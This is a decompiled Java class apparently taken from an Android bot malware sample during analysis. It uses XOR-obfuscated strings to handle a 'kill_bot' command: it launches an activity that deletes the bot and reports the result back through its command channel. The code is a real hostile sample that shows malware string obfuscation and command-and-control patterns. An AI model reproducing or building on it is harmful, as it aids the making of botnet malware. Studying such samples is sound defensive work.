package com.zjxyxnvvp.nxvxchltf.i;

import android.content.Intent;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.ioNWOADnaoidWNaod;
import com.zjxyxnvvp.nxvxchltf.util.a;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class h {
    private static short[] $ = {6263, 6261, 6256, 6256, 6211, 6270, 6259, 6248, 7004, 6987, 7005, 7003, 6978, 7002, 9128, 9093, 9105, 9098, 9095, 9100, 9089, 9088, 9156, 9093, 9095, 9104, 9101, 9106, 9101, 9104, 9117, 9156, 9104, 9099, 9156, 9088, 9089, 9096, 9089, 9104, 9089, 9156, 9094, 9099, 9104};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a() {
        UIDNwaidobaWIODb uIDNwaidobaWIODb = UIDNwaidobaWIODb.e;
        if (!UIDNwaidobaWIODb.k) {
            d dVar = d.e;
            p pVar = dVar.c;
            String $2 = $(0, 8, 6172);
            if (pVar.b($2) != null) {
                ioNWOADnaoidWNaod.f341a = uIDNwaidobaWIODb.getPackageName();
                a.h = Long.MAX_VALUE;
                uIDNwaidobaWIODb.startActivity(new Intent(uIDNwaidobaWIODb, ioNWOADnaoidWNaod.class).addFlags(268435456).addFlags(1073741824));
                JSONObject jSONObject = new JSONObject();
                try {
                    jSONObject.put($(8, 14, 6958), $(14, 45, 9188));
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                dVar.c.e($2, jSONObject);
            }
        }
    }
}
